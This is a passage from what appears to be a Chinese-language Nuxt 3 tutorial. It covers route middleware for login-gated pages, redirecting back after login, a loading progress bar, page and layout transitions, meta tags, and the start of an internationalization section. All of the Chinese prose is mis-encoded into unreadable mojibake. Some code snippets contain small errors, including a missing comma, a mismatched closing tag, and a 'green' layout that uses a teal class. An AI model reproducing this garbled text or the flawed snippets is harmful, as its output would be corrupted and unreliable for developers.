db.article.getArticles() return articlesRecord }) æˆ‘å€‘ä¹Ÿå¯ä»¥åœ¨ ./server/api/articles.get.js è™•ç†å‡½æ•¸å…§ï¼Œæ·»åŠ è³‡æ–™çš„åˆ†é æˆ–ç‚ºæ–‡ç« è³‡æ–™é€²è¡ŒåŠ å·¥ï¼Œä»¥åˆ©å‰ç«¯é¡¯ç¤ºã€‚\næˆ‘å€‘å»ºç«‹å¥½äº†éƒ¨è½å€‹çš„ç‰ˆé¢ï¼Œæœ‰äº†å°è¦½åˆ—å’Œä½¿ç”¨è€…é¸å–®ï¼Œç¶²ç«™çœ‹èµ·ä¾†ä¹Ÿæ›´å°ˆæ¥­äº†ä¸€äº›ï¼Œçµåˆå¸ƒå±€æ¨¡æ¿ï¼Œæˆ‘å€‘å¯ä»¥æ§åˆ¶æ¯å€‹é é¢æ‰€é¡¯ç¤ºçš„å¸ƒå±€ï¼Œåœ¨æœªä¾†æœ‰æ›´å¤šé é¢çš„æ™‚å€™èƒ½å…·æœ‰å¯æ§æ€§ã€‚æœ€å¾Œä¹Ÿå¯¦ä½œäº†æ–°å¢æ–‡ç« çš„ APIï¼Œå®Œæˆäº†ç¬¬ä¸€ç¯‡æ–‡ç« çš„æ–°å¢èˆ‡ç€è¦½ã€‚\né é¢çš„å°èˆªå®ˆè¡›èˆ‡åˆ‡æ›æ•ˆæœ æˆ‘å€‘å®Œæˆäº†æ–°å¢æ–‡ç« çš„é é¢èˆ‡æµç¨‹ï¼Œåœ¨ç¶²ç«™é–‹ç™¼çš„éç¨‹ä¸­ï¼Œæœ‰äº›é é¢æ˜¯å…·æœ‰ç€è¦½çš„é™åˆ¶ï¼Œä¾‹å¦‚ï¼Œæˆ‘å€‘ä¸å¸Œæœ›ä¸€èˆ¬çš„ä½¿ç”¨è€…èƒ½é€²åˆ°ç®¡ç†è€…é é¢å°ˆç”¨çš„é é¢é€²è¡Œæ“ä½œï¼Œé€™æ™‚å€™æˆ‘å€‘å°±éœ€è¦åšä¸€äº›æ¬Šé™çš„é©—è­‰èˆ‡é™åˆ¶ï¼Œåœ¨ Nuxt çš„é é¢æä¾›äº†è·¯ç”±ä¸­é–“ä»¶å¯ä»¥åœ¨æˆ‘å€‘å°èˆªè‡³é é¢ä¹‹å‰ï¼ŒåŸ·è¡Œä¸€äº›è™•ç†å‡½æ•¸ï¼Œå°±å¯¦ä½œå°èˆªå®ˆè¡› (Navigations Guards) çš„æ•ˆæœã€‚æœ€å¾Œæœƒä»‹ç´¹ä¸€ä¸‹åœ¨ Nuxt 3 æ‰€æä¾›çš„é é¢å’Œå¸ƒå±€åˆ‡æ›æ™‚çš„é€²åº¦æ¢ (Progress bar) èˆ‡è½‰å ´æ•ˆæœ (Transitions)ã€‚\né é¢é–“çš„å°èˆªå®ˆè¡› åªå…è¨±å·²ç™»å…¥ä½¿ç”¨è€…æ–°å¢æ–‡ç«  é¦–å…ˆï¼Œæˆ‘å€‘æ–°å¢ä¸€å€‹è·¯ç”±ä¸­é–“ä»¶ ./middleware/manage-auth.js å…§å®¹å¦‚ä¸‹ï¼š\nmiddleware/manage-auth.js 1 2 3 4 5 6 7 8 9 10 11 12 13 import { useUserStore } from \u0026#39;@/stores/user\u0026#39; export default defineNuxtRouteMiddleware(() =\u0026gt; { if (process.client) { const userStore = useUserStore() if (!userStore.profile?.id) { return navigateTo(\u0026#39;/login\u0026#39;) } } else { return navigateTo(\u0026#39;/\u0026#39;) } }) åœ¨é é¢å…ƒä»¶ä¸­ä½¿ç”¨ definePageMeta() ä¾†å¥—ç”¨ manage-auth ä¸­é–“ä»¶ã€‚èª¿æ•´ ./pages/manage/articles/create.vue å…§å®¹ï¼š\npages/manage/articles/create.vue 1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; // ... definePageMeta({ middleware: \u0026#39;manage-auth\u0026#39; }) \u0026lt;/script\u0026gt; æˆ‘å€‘é¦–é æ–°å¢ä¸€å€‹å¯ä»¥å°å‘è‡³ /manage/articles/create é é¢çš„æŒ‰éˆ•ã€‚\n1 2 3 4 5 6 \u0026lt;NuxtLink class=\u0026#34;text-md mt-12 rounded-sm bg-emerald-500 py-2 px-4 font-medium text-white hover:bg-emerald-600 focus:outline-none focus:ring-2 focus:ring-emerald-400 focus:ring-offset-2\u0026#34; to=\u0026#34;/manage/articles/create\u0026#34; \u0026gt; å‰å¾€æ’°å¯«æ–‡ç«  \u0026lt;/NuxtLink\u0026gt; ç•¶æˆ‘å€‘è™•æ–¼æœªç™»å…¥çš„æƒ…æ³ï¼Œé»æ“Šå‰å¾€å¾Œï¼Œæœƒç¶“ç”±ä¸­é–“ä»¶åˆ¤æ–· process.client æ˜¯å¦æ˜¯åœ¨å®¢æˆ¶ç«¯ï¼Œé€²è€Œå¾ User Store å–å‡ºä½¿ç”¨è€…è³‡è¨Šé€²è¡Œåˆ¤æ–·ï¼Œç•¶ä¸å­˜åœ¨ userStore.profile.id æ™‚ï¼Œè¡¨ç¤ºæœªç™»å…¥ï¼Œæˆ‘å€‘å°‡å°èˆªè‡³ç™»å…¥é é¢ /loginï¼›ç•¶ç™»å…¥å®Œæˆå¾Œï¼Œå°±å¯ä»¥ä½¿ç”¨æŒ‰éˆ•æˆåŠŸå°èˆªè‡³æ–°å¢æ–‡ç« çš„é é¢ã€‚å¦‚æœ process.client ç‚º falseï¼Œè¡¨ç¤ºå°èˆªæ˜¯åœ¨ä¼ºæœå™¨ç«¯è§¸ç™¼çš„ï¼Œä¾‹å¦‚ï¼Œæˆ‘å€‘ç›´æ¥é€éç¶²å€é€²å…¥æ–°å¢æ–‡ç« é é¢ï¼Œå°‡æœƒä¸€å¾‹è¢«é‡æ–°å°èˆªè‡³é¦–é ã€‚\nç™»å…¥å®Œæˆå¾Œå°å›è‡³ç™»å…¥å‰ç€è¦½çš„é é¢ ç•¶ä½¿ç”¨è€…åœ¨ç€è¦½ç¶²ç«™æ™‚è¢«å¼•å°æˆ–æº–å‚™ç™»å…¥æ™‚ï¼Œæˆ‘å€‘å¯ä»¥å°‡ä½¿ç”¨è€…ç›®å‰çš„é é¢é€²è¡Œè¨˜éŒ„ï¼Œä»¥ä¾¿ç™»å…¥å®Œæˆå¾Œï¼Œå¯ä»¥é‡æ–°å°å‘è‡³ä½¿ç”¨è€…ç™»å…¥å‰çš„é é¢ï¼Œä»¥æ­¤æä¾›ä½¿ç”¨è€…æ›´æ£’çš„é«”é©—ã€‚\né¦–å…ˆï¼Œæˆ‘å€‘æ–°å¢ä¸€å€‹è·¯ç”±ä¸­é–“ä»¶ ./middleware/logged-in-redirect.js å…§å®¹å¦‚ä¸‹ï¼š\nmiddleware/logged-in-redirect.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 export default defineNuxtRouteMiddleware((to, from) =\u0026gt; { if (from \u0026amp;\u0026amp; to.path !== from.path \u0026amp;\u0026amp; !to.query.redirect_to) { let redirectTo = null if (from.query.redirect_to) { redirectTo = from.query.redirect_to from.query.redirect_to = undefined } else { redirectTo = from.fullPath } to.query.redirect_to = redirectTo return navigateTo(to) } }) é€™å€‹ logged-in-redirect ä¸­é–“ä»¶çš„è™•ç†é‚è¼¯ï¼Œæˆ‘å€‘æ¥æ”¶ to èˆ‡ fromï¼Œåˆ†åˆ¥ç‚ºç›®æ¨™é é¢èˆ‡ä¾†æºé é¢ï¼Œç•¶ä½¿ç”¨è€…ç›®æ¨™é é¢ /login é‚„æœªå¸¶ä¸Šäº† Query åƒæ•¸ redirect_toï¼Œæˆ‘å€‘å°±å°‡ä¾†æºçš„å®Œæ•´è·¯å¾‘æ·»åŠ ä¸Šå» from.fullPathï¼Œæœ€å¾Œé€²è¡Œå°å‘ã€‚\né€™è£¡éœ€è¦é€²è¡Œåˆ¤æ–· redirect_toï¼Œå¦å‰‡æœƒé‡è¤‡ç™¼ç”Ÿé‡æ–°å°å‘ã€‚\nåœ¨ç™»å…¥é é¢ä¸­ä½¿ç”¨ definePageMeta() ä¾†å¥—ç”¨ logged-in-redirect ä¸­é–“ä»¶ã€‚èª¿æ•´ ./pages/login.vue å…§å®¹ï¼š\npages/login.vue 1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; // ... definePageMeta({ middleware: \u0026#39;logged-in-redirect\u0026#39; }) \u0026lt;/script\u0026gt; åœ¨ç™»å…¥å®Œæˆçš„åœ°æ–¹ï¼Œæˆ‘å€‘å°±å¯ä»¥ä½¿ç”¨ navigateTo() å°å‘è‡³ redirect_to çµ¦çš„é é¢è·¯å¾‘ã€‚\n1 2 3 4 5 6 7 8 9 \u0026lt;script setup\u0026gt; const route = useRoute() const handleEmailLogin = async () =\u0026gt; { // ... navigateTo(route.query.redirect_to ?? \u0026#39;/\u0026#39;) } \u0026lt;/script\u0026gt; å®Œæˆå¾Œï¼Œæˆ‘å€‘å¾é¦–é é»æ“Šç™»å…¥å¾Œï¼ç•¶ç™»å…¥å®Œæˆå¾Œå°±æœƒå°å‘å›é¦–é ï¼›è€Œå¾æ–‡ç« é é¢é»æ“Šç™»å…¥ï¼Œå®Œæˆå¾Œå‰‡æœƒå°å‘å›æ–‡ç« é é¢ã€‚\né é¢è¼‰å…¥é€²åº¦å…ƒä»¶ Nuxt 3 æä¾›ä¸€å€‹ \u0026lt;NuxtLoadingIndicator\u0026gt; å…ƒä»¶ï¼Œç”¨ä½œé é¢å°èˆªå¾Œé¡¯ç¤ºè¼‰å…¥çš„é€²åº¦ï¼Œæœƒåœ¨é é¢ä¸Šæ–¹æœ‰ä¸€å€‹é€²åº¦æ¢ (Progress bar)ã€‚\nåªéœ€è¦å°‡ \u0026lt;NuxtLoadingIndicator\u0026gt; å…ƒä»¶æ·»åŠ è‡³ app.vue æˆ–å¸ƒå±€ä¹‹ä¸­ï¼Œèª¿æ•´ app.vue å…§å®¹å¦‚ä¸‹ï¼š\napp.vue 1 2 3 4 5 6 \u0026lt;template\u0026gt; \u0026lt;NuxtLayout\u0026gt; \u0026lt;NuxtLoadingIndicator /\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/template\u0026gt; å…ƒä»¶å¯ä»¥å‚³å…¥çš„å±¬æ€§ (Props) å¦‚ä¸‹ï¼š\ncolorï¼šé€²åº¦æ¢çš„é¡è‰²ï¼Œå¯ä»¥å‚³å…¥CSS æ”¯æ´çš„è‰²ç¢¼æˆ– repeating-linear-gradient() å‡½æ•°ï¼Œé è¨­ç‚º repeating-linear-gradient(to right,#00dc82 0%,#34cdfe 50%,#0047e1 100%)ã€‚ heightï¼šé€²åº¦æ¢çš„é«˜åº¦æ•¸å€¼ï¼Œå–®ä½ï¼š pxï¼Œé è¨­å€¼ç‚º 3ã€‚ durationï¼šé€²åº¦æ¢è¼‰å…¥çš„æŒçºŒæ™‚é–“ï¼Œå–®ä½ï¼š æ¯«ç§’ï¼Œé è¨­å€¼ç‚º 2000ã€‚ throttleï¼šé€²åº¦æ¢çš„éš±è—èˆ‡é¡¯ç¤ºï¼Œé™åˆ¶åœ¨ç‰¹å®šæ™‚é–“å…§åƒ…è§¸ç™¼ä¸€æ¬¡ï¼Œå–®ä½ï¼š æ¯«ç§’ï¼Œé è¨­å€¼ç‚º 200ã€‚ ç•¶æˆ‘å€‘å¾é¦–é åˆ‡æ›é é¢æ™‚ï¼Œç¶²é ä¸Šæ–¹å°±æœƒå‡ºç¾ä¸€å€‹é€²åº¦æ¢ï¼Œè¡¨ç¤ºé é¢æ­£åœ¨è¼‰å…¥ä¸­ã€‚\né é¢åˆ‡æ›çš„è½‰å ´æ•ˆæœ é™¤äº†è¼‰å…¥çš„é€²åº¦æ¢ï¼Œé é¢åˆ‡æ›ä¹‹é–“ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è½‰å ´æ•ˆæœ (Transitions) ä¾†è®“é é¢ä¹‹é–“çš„éŠœæ¥æ›´æŸ”é †ï¼ŒNuxt åˆ©ç”¨äº† Vue å…§å»ºçš„ \u0026lt;Transition\u0026gt; å…ƒä»¶ä¾†å¹«åŠ©è™•ç†è½‰å ´å’Œå‹•ç•«ï¼Œç”¨ä»¥éŸ¿æ‡‰ä¸æ–·è®ŠåŒ–çš„é é¢èˆ‡ç‹€æ…‹ã€‚\nNuxt é è¨­ç‚ºæ‰€æœ‰é é¢ (Pages) éƒ½è¨­ç½®äº†è½‰å ´ï¼Œå¦‚æœè¦å•Ÿç”¨ï¼Œè«‹å°‡ä»¥ä¸‹ CSS æ·»åŠ è‡³ app.vue ä¸­ï¼š\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;NuxtPage /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;style\u0026gt; .page-enter-active, .page-leave-active { transition: all 0.4s; } .page-enter-from, .page-leave-to { opacity: 0; filter: blur(1rem); } \u0026lt;/style\u0026gt; æ¯å€‹é é¢çš„ pageTransition é è¨­å±¬æ€§çš†ç‚º { name: 'page', mode: 'out-in' }ï¼Œname ç‚º page ä¹Ÿå°±å°æ‡‰äº† CSS é¡åˆ¥çš„é–‹é ­ï¼›mode æœ‰ in-outã€out-in åŠ default ä¸‰ç¨®åƒæ•¸å¯é¸ã€‚\n1 2 3 4 5 6 7 8 9 .[pageTransition.name]-enter-active, .[pageTransition.name]-leave-active { transition: all 0.4s; } .[pageTransition.name]-enter-from, .[pageTransition.name]-leave-to { opacity: 0; filter: blur(1rem); } å¥—ç”¨å¥½é é¢çš„è½‰å ´ï¼Œå°±æœƒæœ‰åˆ‡æ›é é¢æ™‚æœ‰æ¨¡ç³Šçš„æ•ˆæœã€‚\nè‡ªè¨‚é é¢çš„è½‰å ´ æ—¢ç„¶çŸ¥é“ pageTransition çš„ name æœƒå°æ‡‰é é¢è½‰å ´çš„ CSS åç¨±ï¼Œæˆ‘å€‘å°±å¯ä»¥ä¾†è‡ªå®šç¾©æ›´å¤šè½‰å ´ï¼Œè®“ä¸åŒé é¢å¥—ç”¨ä¸åŒçš„æ•ˆæœã€‚\nä¾‹å¦‚åœ¨ app.vue æ·»åŠ  rotate ç‚ºå‰ç¶´çš„é¡åˆ¥åç¨± CSSã€‚\napp.vue 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;style\u0026gt; /* ... */ .rotate-enter-active, .rotate-leave-active { transition: all 0.4s; } .rotate-enter-from, .rotate-leave-to { opacity: 0; transform: rotate3d(1, 1, 1, 15deg); } \u0026lt;/style\u0026gt; åœ¨é é¢ä¸­ä½¿ç”¨ definePageMeta() ä¾†è¨­å®š pageTransition.name ç‚º rotateã€‚èª¿æ•´ ./pages/login.vue æ·»åŠ å¦‚ä¸‹ç¨‹å¼ç¢¼ã€‚\npages/login.vue 1 2 3 4 5 6 7 8 9 \u0026lt;script setup\u0026gt; // ... definePageMeta({ pageTransition: { name: \u0026#39;rotate\u0026#39; } }) \u0026lt;/script\u0026gt; ç•¶é é¢åˆ‡æ›æ™‚ï¼Œçš†æœƒä½¿ç”¨é è¨­çš„æ¨¡ç³Šè½‰å ´æ•ˆæœï¼Œç•¶åˆ‡æ›è‡³ç™»å…¥é é¢å°±æœƒå¥—ç”¨æŒ‡å®šçš„ rotate é é¢è½‰å ´ï¼Œè€Œæœ‰æ—‹è½‰çš„è½‰å ´æ•ˆæœã€‚\nå¸ƒå±€çš„è½‰å ´æ•ˆæœ Nuxt åŒæ¨£ç‚ºæ‰€æœ‰å¸ƒå±€ (Layouts) éƒ½è¨­ç½®äº†è½‰å ´ï¼Œå¦‚æœè¦å•Ÿç”¨ï¼Œè«‹å°‡ä»¥ä¸‹ CSS æ·»åŠ è‡³ app.vue ä¸­ã€‚\n1 2 3 4 5 6 7 8 .layout-enter-active, .layout-leave-active { transition: all 0.4s; } .layout-enter-from, .layout-leave-to { filter: grayscale(1); } å»ºç«‹ ./layouts/teal.vue å¸ƒå±€ï¼Œç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\nlayouts/teal.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;h-screen bg-teal-50\u0026#34;\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; å°‡ç™»å…¥é é¢çš„å¸ƒå±€å¥—ç”¨ tealã€‚\n1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; // ... definePageMeta({ layout: \u0026#39;teal\u0026#39; }) \u0026lt;/script\u0026gt; å»ºç«‹ ./layouts/green.vue å¸ƒå±€ï¼Œç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š\nlayouts/green.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;h-screen bg-teal-50\u0026#34;\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; å°‡è¨»å†Šé é¢çš„å¸ƒå±€å¥—ç”¨ greenã€‚\n1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; // ... definePageMeta({ layout: \u0026#39;green\u0026#39; }) \u0026lt;/script\u0026gt; åœ¨ç™»å…¥é é¢èˆ‡è¨»å†Šé é¢åˆ‡æ›æ™‚ï¼Œå› ç‚ºå…©å€‹é é¢ä½¿ç”¨äº†ä¸åŒçš„å¸ƒå±€ï¼Œå¸ƒå±€çš„è½‰å ´æ•ˆæœï¼Œä½¿èƒŒå½±é¡è‰²æœƒæœ‰ç°éšæ•ˆæœçš„è½‰å ´ã€‚\nä½ ä¹Ÿå¯ä»¥åƒè‡ªè¨‚é é¢è½‰å ´ä¸€æ¨£ï¼Œä¾†ä½¿ç”¨ definePageMeta() è¨­å®š layoutTransition.name å±¬æ€§ï¼Œä¾†æŒ‡å®šè‡ªè¨‚çš„è½‰å ´æ•ˆæœã€‚\n1 2 3 4 5 6 7 8 \u0026lt;script setup\u0026gt; definePageMeta({ layout: \u0026#39;green\u0026#39;, layoutTransition: { name: \u0026#39;slide-in\u0026#39; } }) \u0026lt;/script\u0026gt; ç¦ç”¨è½‰å ´æ•ˆæœ é é¢èˆ‡å¸ƒå±€çš„è½‰å ´æ•ˆæœï¼Œéƒ½å¯ä»¥é€é definePageMeta ä¾†è¨­å®š pageTransition æˆ– layoutTransition ç‚º false ä¾†ç¦æ­¢å¥—ç”¨è½‰å ´æ•ˆæœã€‚\n1 2 3 4 5 6 \u0026lt;script setup\u0026gt; definePageMeta({ pageTransition: false layoutTransition: false }) \u0026lt;/script\u0026gt; å…¨åŸŸé è¨­çš„è½‰å ´æ•ˆæœ ä½ ä¹Ÿå¯ä»¥åœ¨ nuxt.config.ts è¨­ç½®é è¨­çš„é é¢èˆ‡è½‰å ´æ•ˆæœï¼Œä¾‹å¦‚ï¼š\nnuxt.config.ts 1 2 3 4 5 6 7 8 9 10 export default defineNuxtConfig({ pageTransition: { name: \u0026#39;fade\u0026#39;, mode: \u0026#39;out-in\u0026#39; // default }, layoutTransition: { name: \u0026#39;slide\u0026#39;, mode: \u0026#39;out-in\u0026#39; // default } }) ç•¶ç„¶è¦å°‡æ‰€æœ‰é é¢èˆ‡å¸ƒå±€é è¨­ç¦ç”¨ä¹Ÿå¯ä»¥è¨­ç½®å¦‚ä¸‹ï¼š\n1 2 3 4 export default defineNuxtConfig({ pageTransition: false, layoutTransition: false }) pageTransition èˆ‡ layoutTransition æ¥å—çš„å±¬æ€§å¯ä»¥åƒè€ƒ TransitionPropsã€‚\nå…ƒä»¶å±¬æ€§å‚³å…¥ transition åœ¨ app.vue ä¸­ä½¿ç”¨ \u0026lt;NuxtPage /\u0026gt; æ™‚ï¼Œä½ å¯ä»¥å°‡ TransitionProps ä½œç‚ºå…ƒä»¶çš„ Props ä¾†å•Ÿç”¨å…¨åŸŸé è¨­çš„è½‰å ´æ•ˆæœã€‚\n1 2 3 4 5 6 7 8 9 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;NuxtPage :transition=\u0026#34;{ name: \u0026#39;bounce\u0026#39;, mode: \u0026#39;out-in\u0026#39; }\u0026#34; /\u0026gt; \u0026lt;/NuxtLayout\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; ç•¶ä½¿ç”¨æ­¤æ–¹æ³•è¨­å®šè½‰å ´æ•ˆæœæ™‚ï¼Œå°±ä¸èƒ½åœ¨é é¢ä¸­ä½¿ç”¨ definePageMeta() ä¾†è¦†è“‹é€™è£¡çš„é é¢è½‰å ´è¨­ç½®ã€‚\nä»¥ä¸Šæˆ‘å€‘ä¸»è¦å¯¦ä½œäº†å°èˆªå®ˆè¡›ï¼Œä¾†ç‚ºç‰¹å®šé é¢æ·»åŠ ç€è¦½çš„æ¬Šé™ï¼Œæˆ‘å€‘é™¤äº†ä½¿ç”¨å®¢æˆ¶ç«¯çš„ User Store é©—è­‰å¤–ï¼Œä¹Ÿå¯ä»¥æ­é… Cookie å†å¾Œç«¯é€²è¡Œé©—è­‰ï¼Œç”šè‡³ç‚ºæ¯å€‹è«‹æ±‚è§£æä½¿ç”¨è€…ï¼Œä¸¦æŸ¥è©¢è³‡æ–™åº«æ˜¯å¦å…·æœ‰æ¬Šé™ç€è¦½ï¼Œä»¥æ­¤ä¾†æ§åˆ¶ä½¿ç”¨è€…ç€è¦½é é¢çš„æ¬Šé™ï¼Œé™¤äº†å‰ç«¯çš„é˜»æ“‹å¤–ï¼Œæ›´é‡è¦çš„æ˜¯å¾Œç«¯ API ä¹Ÿéœ€è¦æ­é…é€²è¡Œæ¬Šé™é©—è­‰ï¼Œæ‰èƒ½æœ‰è¦çš„é˜²æ­¢ç¶²é æ¼æ´ç”¢ç”Ÿï¼Œå¦å‰‡å¯èƒ½æœƒç™¼ç”Ÿï¼Œä½¿ç”¨è€…ç„¡æ¬Šç€è¦½æ–°å¢æˆ–ç®¡ç†çš„é é¢ï¼Œä½†æ˜¯å¯ä»¥é€éæ‰“ API ä¾†é€²è¡Œç›¸é—œæ“ä½œï¼Œé€™æ¨£æ˜¯éå¸¸å±éšªçš„ã€‚æœ€å¾Œï¼Œæˆ‘å€‘å°‡é é¢åˆ‡æ›æ™‚è¨­ç½®äº†é€²åº¦æ¢èˆ‡è½‰å ´æ•ˆæœï¼Œä½¿å¾—æ•´é«”ç¶²ç«™èƒ½æä¾›ä½¿ç”¨è€…æ›´å¥½çš„æ“ä½œé«”é©—ï¼Œæ›´å¤šçš„è½‰å ´è¨­ç½®ï¼Œä¹Ÿå¯ä»¥åƒè€ƒ Nuxt å®˜æ–¹æ–‡ä»¶ã€‚\nç¯„ä¾‹ç¨‹å¼ç¢¼ - Nuxt 3 - è¨­ç½®å°èˆªå®ˆè¡›èˆ‡é é¢åˆ‡æ›æ•ˆæœç¯„ä¾‹\næ·»åŠ  HTML Meta Tag è©³ç´° Nuxt3 æ·»åŠ  HTML Meta Tag çš„èªªæ˜ï¼Œå¯ä»¥åƒè€ƒ ã€Nuxt3ã€‘é–‹ç®±å³ç”¨çš„ Nuxt3 ç©è½‰ç­†è¨˜ - æœå°‹å¼•æ“æœ€ä½³åŒ– (SEO) èˆ‡ HTML Meta Tagï¼Œé€™é‚Šæˆ‘å€‘èªªæ˜ç‚ºå¯¦ä½œçš„éƒ¨è½æ ¼æ–‡ç« æ·»åŠ  Metaï¼Œèª¿æ•´ ./pages/articles/[id].vue æª”æ¡ˆï¼Œæ·»åŠ ä»¥ä¸‹ç¨‹å¼ç¢¼ï¼š\npages/articles/[id].vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script setup\u0026gt; // ... useHead({ meta: [ { name: \u0026#39;description\u0026#39;, content: `${article.value.summary} | Nuxt 3 Blog` }, { name: \u0026#39;keywords\u0026#39;, content: `${article.value.tags}` }, { property: \u0026#39;og:title\u0026#39;, content: `${article.value.title} | Nuxt 3 Blog` }, { property: \u0026#39;og:description\u0026#39;, content: article.value.summary }, { property: \u0026#39;og:image\u0026#39;, content: article.value.cover } ], title: `${article.value.title} | Nuxt 3 Blog` }) \u0026lt;/script\u0026gt; å…¶ä¸­ article æ˜¯æˆ‘å€‘å¾ Server API å›å‚³çš„æŒ‡å®šè²¼æ–‡çš„è³‡æ–™ä¸¦å…·æœ‰éŸ¿æ‡‰æ€§ï¼Œæœ€å¾Œçœ‹çœ‹æˆæœã€‚\nåœ¨ Nuxt 3 æä¾›äº†ä¸€äº›å¯ä»¥è¨­ç½®ç¶²é å±¬æ€§èˆ‡ Meta çš„çµ„åˆå¼å‡½æ•¸ï¼Œæ›´èƒ½å‹•æ…‹çš„èª¿æ•´èˆ‡éŸ¿æ‡‰ï¼Œçµåˆ SSR è®“é€™äº›æ¨™è¨˜åœ¨ä¼ºæœå™¨ç«¯å°±èƒ½æ¸²æŸ“å‡ºä¾†ï¼Œå°ç¶²ç«™åšæœå°‹å¼•æ“æœ€ä½³åŒ– (SEO) éå¸¸å¾—å‹å–„ï¼Œä¹Ÿæ˜¯å¤šæ•¸äººé¸æ“‡ Nuxt 3 ä¾†è™•ç† SSR èˆ‡ SEO çš„åŸå› ã€‚é™¤äº† SEO å¯èƒ½æœƒä½¿ç”¨åˆ°çš„çš„æ¨™è¨˜å¤–ï¼Œä¹Ÿæœ‰ OG Tag å¯ä»¥åŠ å¼·ç¶²é çš„é€£çµé è¦½æ•ˆæœï¼Œé›–ç„¶ OG Tag èˆ‡ SEO æ²’æœ‰çµ•å°çš„é—œä¿‚ï¼Œä½†æ˜¯é€éä¼ºæœå™¨ç«¯æ¸²æŸ“èª¿æ•´é€™äº› Meta å°æœå°‹å¼•æ“æˆ–ç¶²ç«™éƒ½éå¸¸çš„æ–¹ä¾¿ï¼Œæˆ‘å€‘åªè¦æ ¹æ“šéœ€æ±‚åŠæŒ‡å¼•åšè¨­å®šï¼Œå°±èƒ½å°ç¶²ç«™çš„èƒ½è¦‹åº¦æœ‰æ‰€æå‡ã€‚\né‚å‘åœ‹éš›åŒ–å¯¦ä½œå¤šåœ‹èªç³»I18n ç•¶ä¸€å€‹ç¶²ç«™éœ€è¦é¢å‘ä¸åŒåœ‹å®¶æˆ–ä¸åŒèªè¨€çš„ä½¿ç”¨è€…ï¼Œæˆ‘å€‘å°±éœ€è¦åšåœ‹éš›åŒ– (Internationalization)ï¼Œå°‡ç¶²ç«™å…§å®¹é€²è¡Œç¿»è­¯æˆ–èªè¨€çš„å°æ‡‰ï¼Œè®“ä½¿ç”¨è€…èƒ½ç†è§£ç¶²é ä¸Šçš„æ“ä½œæˆ–å…§å®¹ï¼ŒI18n æ„è¬‚è‘—ã€ŒInternationalizationã€é€™å€‹å–®å­—ä¸­ï¼ŒI å’Œ n ä¹‹é–“æœ‰ 18 å€‹å­—æ¯ï¼Œä¹Ÿæ­£æ˜¯å„å€‹æ¡†æ¶çš„å¯¦ä½œå¤šåœ‹èªç³»å¥—ä»¶çš„ä¸€å€‹å¸¸ç”¨åç¨±ï¼Œä¾‹å¦‚ Vue ç”Ÿæ…‹å°±æœ‰ vue-i18nï¼Œè€Œé€™ç¯‡æ–‡ç« å°‡è¬›è¿°å¦‚ä½•åœ¨ Nuxt 3 ä¸­æ•´åˆ Vue I18n ä¾†å”åŠ©å¯¦ä½œå¤šåœ‹èªç³»ã€‚\nNuxt 3 ä½¿ç”¨ Vue I18n æƒ³è¦åœ¨ Vue 3 ä½¿ç”¨ Vue I18n ç²å¾—æ¯”è¼ƒå¥½çš„æ”¯æ´åº¦éœ€è¦ä½¿ç”¨æ­£è™•æ–¼ Beta éšæ®µçš„ v9 ç‰ˆæœ¬ï¼Œå› æ­¤æœ‰å¹¾ç¨®æ–¹å¼å¯ä»¥åœ¨ Nuxt æ•´åˆ Vue I18nï¼Œåˆ†åˆ¥æ˜¯ä¾ç…§ Vue I18n å®˜æ–¹æŒ‡å¼•ã€ä½¿ç”¨ Nuxt Communityæä¾›çš„ @nuxtjs/i18n@next æ¨¡çµ„åŠ @intlify/nuxt3 æ¨¡çµ„ã€‚\næ¯”è¼ƒæ—©ä»¥å‰ï¼ŒNuxt 3 ç¤¾ç¾¤æ¨¡çµ„é‚„æ²’æœ‰æ”¯æ´æ¯”è¼ƒæ–°çš„ Vue I18nï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±é¡å¤–çš„è£½ä½œæ’ä»¶ä¾†å®‰è£ï¼Œå¾Œä¾†ä¹Ÿæœ‰ä¸€äº›ç›¸å®¹æ€§çš„å•é¡Œï¼Œæ‰€ä»¥ Vue I18n v9 çš„ä½œè€… kazupon ç™¼å¸ƒäº† @intlify/nuxt3 æ¨¡çµ„ä¾†æ–¹ä¾¿ Nuxt 3 æ•´åˆ vue-i18n-next (Vue I18n v9)ï¼Œç›®å‰ä»ç„¶å¯ä»¥ä½¿ç”¨ @intlify/nuxt3 ä¾†é€²è¡Œæ•´åˆï¼Œä½†æˆ‘æœ€å¾Œé¸æ“‡ä½¿ç”¨ @nuxtjs/i18n@next æ¨¡çµ„ï¼Œé™¤äº†çœ‹å¥½æ˜¯ç”± Nuxt Community æä¾›çš„æ”¯æ´åŠæœªä¾†çš„ç™¼å±•å¤–ï¼Œä¹Ÿèƒ½ä½¿ç”¨åˆ° @nuxtjs/i18n æä¾›çš„ä¸€äº›çµ„åˆå‡½æ•¸ç­‰ã€‚\nNuxt 3 æ•´åˆ @nuxtjs/i18n ç›®å‰ @nuxtjs/i18n æ¨¡çµ„çš„ç©©å®šç‰ˆæœ¬åœ¨ v7.3.0ï¼Œè€Œä½¿ç”¨ Vue 3 å’Œ Vue I18n v9 çš„æ¨¡çµ„å‰‡æ˜¯ä¸‹ä¸€å€‹è¿­ä»£ç‰ˆæœ¬ v8ï¼Œæ‰€ä»¥ä½¿ç”¨ NPM 